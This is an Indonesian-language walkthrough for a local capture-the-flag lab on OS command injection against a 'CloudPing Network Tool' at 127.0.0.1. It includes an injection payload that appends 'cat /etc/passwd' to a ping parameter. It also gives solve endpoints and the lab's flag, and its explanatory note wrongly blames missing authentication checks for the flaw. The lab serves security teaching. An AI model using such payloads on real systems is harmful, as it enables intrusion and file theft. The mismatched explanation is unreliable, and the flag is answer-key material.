# Panduan Praktik Terbimbing: Investigasi OS Command Injection via Unsanitized File Utilities

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **CloudPing Network Tool** pada `http://127.0.0.1:8050`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8050/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A05-03","port":8050,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8050/`
3. Amati antarmuka operasional **CloudPing Network Tool** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (OS Command Injection via Unsanitized File Utilities)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8050/api/tools/ping -d "host=127.0.0.1;cat /etc/passwd"
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/x-www-form-urlencoded` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8050/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8050/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A05-03","flag":"ZITERA{c0mm4nd_1nj3ct10n_sh3ll_3x3c_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{c0mm4nd_1nj3ct10n_sh3ll_3x3c_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
